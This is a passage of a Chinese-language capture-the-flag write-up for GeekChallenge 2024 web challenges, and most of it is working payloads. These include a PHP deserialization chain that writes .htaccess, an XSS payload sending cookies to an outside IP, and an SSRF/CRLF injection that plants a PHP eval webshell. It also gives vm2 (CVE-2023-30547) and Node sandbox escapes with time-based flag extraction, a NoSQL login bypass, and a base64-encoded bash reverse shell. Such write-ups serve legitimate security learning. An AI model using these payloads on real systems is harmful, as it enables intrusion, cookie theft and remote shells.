class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng-&gt;GSBP-&gt;starven=<span class="string">&#x27;php://filter/write=string.strip_tags/resource=?&gt;php_value auto_prepend_file &quot;/flag&quot;&lt;?/../../.htaccess&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;J1rry=<span class="string">&quot;data://text/plain;base64,V2VsY29tZSBHZWVrQ2hhbGxlbmdlIDIwMjQ=&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>这个反序列化的链子还是挺简单的，其实就是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lover&#123;__destruct&#125;-&gt;Geek&#123;__get()&#125;-&gt;lover&#123;__invoke&#125;-&gt;Geek&#123;__toString&#125;-&gt;SYC&#123;__call&#125;</span><br></pre></td></tr></table></figure><br>其实有两个waf第一个检测meimeng可以直接使用大写S加16进行绕过。file_get_contents($this-&gt;J1rry)就直接使用data://协议即可<br>最后写入文件我们还需要绕过exit函数，我试了一下，感觉找不到编码的过滤器于是我使用string.strip_tags去除exit然后将php_value auto_prepend_file “/flag”写入.htaccess使得php文件包含/flag这样在输入payload时就有机会将flag带出来（偶然试出来的），（正解应该时要写入一个jpg文件，然后将其解析为php文件，之后再文件头引入/flag，这样就可以直接得到flag了）<a target="_blank" rel="noopener" href="https://jututu.top/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/">https://jututu.top/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/</a><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=O:5:&quot;lover&quot;:2:&#123;s:5:&quot;J1rry&quot;;s:61:&quot;data://text/plain;base64,V2VsY29tZSBHZWVrQ2hhbGxlbmdlIDIwMjQ=&quot;;S:7:&quot;\6Deimeng&quot;;O:4:&quot;Geek&quot;:1:&#123;s:4:&quot;GSBP&quot;;O:5:&quot;lover&quot;:2:&#123;s:5:&quot;J1rry&quot;;N;S:7:&quot;\6Deimeng&quot;;O:4:&quot;Geek&quot;:1:&#123;s:4:&quot;GSBP&quot;;O:3:&quot;SYC&quot;:1:&#123;s:7:&quot;starven&quot;;s:101:&quot;php://filter/write=string.strip_tags/resource=?&gt;php_value auto_prepend_file &quot;/flag&quot;&lt;?/../../.htaccess&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-141954645.png" class="">  </p>
<h2 id="Problem-On-My-Web"><a href="#Problem-On-My-Web" class="headerlink" title="Problem_On_My_Web"></a>Problem_On_My_Web</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-164205292.png" class="">  
<p>发现管理员bot会浏览留言板，猜测为xss，且flag再cookie中,且xss没有过滤<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=&#x27;http://xxx.xxx.38.159:8000/cookie.php?cookie=&#x27;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-164601914.png" class=""><br>需要本地ip，进行一下ip头伪造(我是直接用bp插件的)</p>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-172606627.png" class="">  
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-172829581.png" class="">  
<p>后面发现好像不用伪造ip。。。主要是一开始直接用ip不知道为什么报错了<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-172918900.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-173033465.png" class="">  </p>
<h2 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h2><p>签到题就不多说了<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-171029805.png" class=""><br>几个基础的传参，伪造ip头我直接用插件传了一堆进去<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-131010586.png" class="">  </p>
<p>得到token后和key后，进行jwt伪造<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-171504544.png" class=""><br>hasFlag改为true得到flag<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-171517504.png" class="">  </p>
<h2 id="Can-you-Pass-Me"><a href="#Can-you-Pass-Me" class="headerlink" title="Can_you_Pass_Me"></a>Can_you_Pass_Me</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-173331997.png" class="">  
<p>可以发现ssti，直接上我心爱的小fenjing<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-173500689.jpg" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-173928749.png" class=""><br>在读flag时回显如下。<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-173413716.jpg" class=""><br>直接弹shell（也可以打内存马）<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-174124378.png" class="">  </p>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-174142169.png" class="">  
<h2 id="ez-SSRF"><a href="#ez-SSRF" class="headerlink" title="ez_SSRF"></a>ez_SSRF</h2><p>www.zip有源码<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-175301355.png" class=""><br>打开会发现其调用了一个叫ScapClient类的calculator方法。简单查了一下发现，ScapClient就是一个用于创建soap客户端的类，而其中并没有calculator方法即会触发call，也就soap客户端向服务端发起了请求。<br>简单尝试一下</p>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-180728510.png" class="">  
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-180824413.png" class="">  
<p>成功ssrf，我们在看一下另一个php文件<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-180926629.png" class=""><br>可以发现其要求为本地访问，所以我们需要使用ssrf来打他。<br>而要打他我们可以发现<br>我们需要进行POST传值来进行命令执行<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-181054435.png" class=""><br>还需要构造AUTHORIZATION标头，内容为Basic ：加上aaaaaaaaaaaadmin:i_want_to_getI00_inMyT3st的base64编码<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-181150651.png" class=""><br>也就是要构造像下面那样的请求<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 268</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: 123&#x27;s Chrome</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">SOAPAction: &quot;hahaha#calculator&quot;</span><br><span class="line">Authorization: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0</span><br><span class="line"></span><br><span class="line">expression=system(&quot;echo+&#x27;&lt;?php+eval(\$_POST[123]);?&gt;&#x27;+&gt;/var/www/html/LSE.php&quot;);</span><br></pre></td></tr></table></figure><br>之前打das的时候有遇到过需要使用CRLF的情况<a target="_blank" rel="noopener" href="https://www.cnblogs.com/piaomiaohongchen/p/15892211.html">https://www.cnblogs.com/piaomiaohongchen/p/15892211.html</a><br>经过尝试发现其存在CRLF即其解析了我们的%0D%0A。<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-190216221.png" class="">  </p>
<p>又因为UA头的位置在Content-Length: 和Authorization:之上所以我们可以伪造POST请求（如果在Content-Length能不能成功我没尝试过）和Authorization:的内容。<br>即我们可以伪造出上面的payload了<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AAuthorization%3A+Basic+YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0%0D%0AContent-Length%3A+79%0D%0A%0D%0Aexpression=system(&quot;echo+&#x27;&lt;?php+eval(\$_POST[123]);?&gt;&#x27;+&gt;/var/www/html/LSE.php&quot;);</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-190049154.png" class="">  </p>
<p>因为我们的Content-Length为79即POST传参79后的内容都不会被解析，即该请求发到后端被解析的真实表单应该为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx:7777</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: aaaa</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Authorization: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0</span><br><span class="line">Content-Length: 79</span><br><span class="line"></span><br><span class="line">expression=system(&quot;echo &#x27;&lt;?php eval(\$_POST[123]);?&gt;&#x27; &gt;/var/www/html/LSE.php&quot;);</span><br></pre></td></tr></table></figure>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-190408565.png" class="">  
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-190521841.png" class="">  
<p>一开始在打这道题的时候，/flag内是没有真的flag的，而根目录下有个sh文件写着将flag写入到了mysql里，可是在打的时候发现mysql没有开启，而开启mysql要root权限，就这样我怼着提权怼了俩个多小时出不来，于是问了出题人:(（环境出问题了）) </p>
<h2 id="escapeSandbox-PLUS"><a href="#escapeSandbox-PLUS" class="headerlink" title="escapeSandbox_PLUS"></a>escapeSandbox_PLUS</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ſYCLOVER</span><br></pre></td></tr></table></figure><br>参考p牛的js大小写特性的文章可以知道ſYCLOVER会杯大写转为SYCLOVER而小写不会转为syclover<br><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-091937682.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-091955569.png" class=""><br>然后可以发现其为vm2沙箱，那么我们可以试用CVE-2023-30547来打这个逃逸payload如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">async function fn() &#123;</span><br><span class="line">    (function stack() &#123;</span><br><span class="line">        new Error().stack;</span><br><span class="line">        stack();</span><br><span class="line">    &#125;)();</span><br><span class="line">&#125;</span><br><span class="line">p = fn();</span><br><span class="line">p.constructor = &#123;</span><br><span class="line">    [Symbol.species]: class FakePromise &#123;</span><br><span class="line">        constructor(executor) &#123;</span><br><span class="line">            executor(</span><br><span class="line">                (x) =&gt; x,</span><br><span class="line">                (err) =&gt; &#123; return err.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;sleep 3&#x27;); &#125;</span><br><span class="line">            )</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">p.then();</span><br></pre></td></tr></table></figure><br>但是经过实测其没有回显，且好像不出网，curl和ping都不通。于是我就想到使用盲道，打时间延迟<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-131820775.png" class=""><br>可以先测出flag长度再继续盲注<br>payload如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code[]=async%20function%20fn()%20%7B%0A%20%20%20%20(function%20stack()%20%7B%0A%20%20%20%20%20%20%20%20new%20Error().stack%3B%0A%20%20%20%20%20%20%20%20stack()%3B%0A%20%20%20%20%7D)()%3B%0A%7D%0Ap%20%3D%20fn()%3B%0Ap.constructor%20%3D%20%7B%0A%20%20%20%20%5BSymbol.species%5D%3A%20class%20FakePromise%20%7B%0A%20%20%20%20%20%20%20%20constructor(executor)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20executor(%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(x)%20%3D%3E%20x%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(err)%20%3D%3E%20%7B%20return%20err.constructor.constructor(&#x27;return%20process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;$(sleep+$(cat+/flag+|+cut+-c§2§+|+tr+§Y§+3))&#x27;)%3B%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20)%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%7D%3B%0Ap.then()%3B</span><br></pre></td></tr></table></figure><br>我将线程调到1间隔1秒也会出现网络波动，多试几次就好了<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-131625334.png" class=""><br>SYC{vM2_LAstDancE}<br>参考文章:<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1345692">基于时延的盲道研究：受限环境下的内容回传信道</a></p>
<h2 id="noSandbox"><a href="#noSandbox" class="headerlink" title="noSandbox"></a>noSandbox</h2><p>一开始题目有给提示是芒果db。进入后需要登陆，那么猜测其为nosql注入,发现其解析json,构造永真式<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ne&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ne&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>然后就是绕沙箱了。</p>
<p>看到这个沙箱说实话很熟悉，之前打NKCTF时就遇到过类似的，但是这题的waf更死，NKCTF的wp里有一种绕发如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return procBess&#x27;</span>.replace(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span>))();</span><br><span class="line">            <span class="keyword">const</span> obj = p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_procBess&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">const</span> ex = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(obj, <span class="string">&#x27;exeicSync&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">return</span> ex.<span class="title function_">value</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
<p>但是这题过滤了replace。我们需要进行修改。我们可以将前俩个的replace改成大写转小写绕过。而后面一个execSync则不能直接通过这个方法绕过。这里我是使用slice来拆出字符转为小写，然后再用模板字符的方法来拼接上如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">`return proCess`</span>.toLowerCase()</span>))();</span><br><span class="line">            <span class="keyword">const</span> obj = p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">`child_proCess`</span>.<span class="title function_">toLowerCase</span>());</span><br><span class="line">            <span class="keyword">const</span> ex = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(obj, <span class="string">`<span class="subst">$&#123;<span class="string">`exeCSync`</span>.slice(<span class="number">0</span>, <span class="number">3</span>)&#125;</span><span class="subst">$&#123;<span class="string">`exeCSync`</span>.charAt(<span class="number">3</span>).toLowerCase()&#125;</span><span class="subst">$&#123;<span class="string">`exeCSync`</span>.slice(<span class="number">4</span>)&#125;</span>`</span>);</span><br><span class="line">            <span class="keyword">return</span> ex.<span class="title function_">value</span>(<span class="string">`whoami`</span>).<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
<p>然后反弹shell<br>echo c2ggLWkgPiYgL2Rldi90Y3AvaXAvNzc3NyAwPiYx|base64 —decode|bash</p>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-084330822.png" class="">  
<h2 id="100-的⚪"><a href="#100-的⚪" class="headerlink" title="100%的⚪"></a>100%的⚪</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-205047967.png" class="">  
<p>base64解码SYC{5UcH_@_Wo0d3rfUl_CiRc1e}</p>
<h2 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Can you RCE me?</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/start.*now/is&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>], <span class="string">&quot;start now&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Well, you haven&#x27;t started.&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome to GeekChallenge2024!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    <span class="title function_ invoke__">sha1</span>((<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span>) &amp;&amp;</span><br><span class="line">    (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>] != <span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]))</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You took the first step!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$year</span>) &lt; <span class="number">2024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$year</span> + <span class="number">1</span>) &gt; <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Well, I know the year is 2024&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.+?rce/ism&quot;</span>, <span class="variable">$purpose</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$purpose</span>, <span class="string">&quot;rce&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Get the flag now!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;It is not enough to stop you!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;It is so easy, do you know sha1 and md5?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-213500138.png" class="">  
<p>这个判断直接传数组<br><code>__2024.geekchallenge.ctf</code>非法变量名直接使用<code>_[2024.geekchallenge.ctf</code>来传值。<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-213644190.png" class=""><br>可以发现题目的md5值为0e开头的<br>然后sha1开头为0e的绕过md5值aaroZmOk<br>后面的变量我们直接GET传值然后变量覆盖即可<br>intval我们直接使用16进制绕过<br>最后一个正则我们可以看出来第一个用的是+号，这代表这rce前至少有一个，那么直接传入rce即可。(原本想试着用正则回溯的，但是好像GET不能传那么多字符)<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-212917283.png" class="">  </p>
<h2 id="SecretInDrivingSchool"><a href="#SecretInDrivingSchool" class="headerlink" title="SecretInDrivingSchool"></a>SecretInDrivingSchool</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-214339789.png" class="">  
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-214432734.png" class="">  
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-223055029.png" class="">  
